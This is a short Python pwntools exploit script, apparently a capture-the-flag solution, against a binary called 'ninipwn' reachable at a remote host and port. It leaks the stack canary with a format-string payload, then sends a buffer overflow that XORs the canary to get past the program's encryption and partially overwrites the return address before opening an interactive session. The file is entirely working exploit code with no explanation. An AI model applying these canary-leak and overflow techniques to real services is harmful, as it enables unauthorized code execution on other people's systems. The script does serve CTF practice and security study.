#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ninipwn'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '3.75.185.198', 7000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *encryption_service+188
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    io.recvuntil(b':')
    io.sendline(b'4')

    io.recvuntil(b'Key: ')
    payload = b'%39$pAAA\x19\x01'
    io.send(payload)

    io.recvuntil(b'Key selected: ')

    canary = int(io.recvn(18), 16)
    log.info("Canary val: %#x", canary)

    payload = b'A' * 256
    payload += b'B' * 8
    payload +=  p64(canary ^ 0x4141417024393325)
    payload += b'C' * 8
    payload += p8(0x33 ^ 0x25)

    io.recvuntil(b'Text: ')
    io.send(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit() 
